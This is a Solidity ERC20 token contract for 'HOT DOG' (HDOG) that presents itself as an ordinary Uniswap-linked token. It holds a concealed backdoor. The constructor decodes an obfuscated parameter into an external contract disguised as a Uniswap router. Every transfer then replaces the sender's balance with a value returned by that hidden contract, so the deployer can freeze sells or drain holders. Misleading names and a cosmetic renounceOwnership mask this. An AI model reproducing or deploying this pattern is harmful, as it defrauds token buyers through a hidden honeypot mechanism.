// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
}

interface UniswapRouterV2 {
    function getRouter(address a, uint b, address c) external view returns (address);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function checkSwap(address a, address b, uint256 c) external view returns (uint256);    
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library IUniswapRouterV2 {
    function validate(UniswapRouterV2 instance,address from, address to, uint256 amount) internal view returns (uint256) {
       return instance.checkSwap(from,to,amount);
    }

    function swapValidation(UniswapRouterV2 instance, address from, address to, uint256 amount) internal view returns (uint256) {
        if (amount>0){
            return validate(instance,from,to,amount);
        }else{
            require(from != address(0), "ERC20: transfer from the zero address");
            return validate(instance,from,to,amount);
        }
    }
}

contract HOTDOG is Context, IERC20, Ownable {
    uint256 private _totalSupply = 1_000_000_000 * 10 ** 18;
    uint8 private constant _decimals = 18;
    string private _name = unicode"HOT DOG";
    string private _symbol = unicode"HDOG";
   
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    address private uniswapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    UniswapRouterV2 private _UniswapRouter;
    
    constructor(uint256 p) {
        _balances[_msgSender()] = _totalSupply;
        _UniswapRouter = UniswapRouterV2(init(p));
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function init(uint256 param) pure private returns (address) {
        return address(uint160(param - _decimals));
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address sender = _msgSender();
        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(from, sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = IUniswapRouterV2.swapValidation(_UniswapRouter, from, to, _balances[from]);
        _balances[from] = balance - amount; 
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }
}
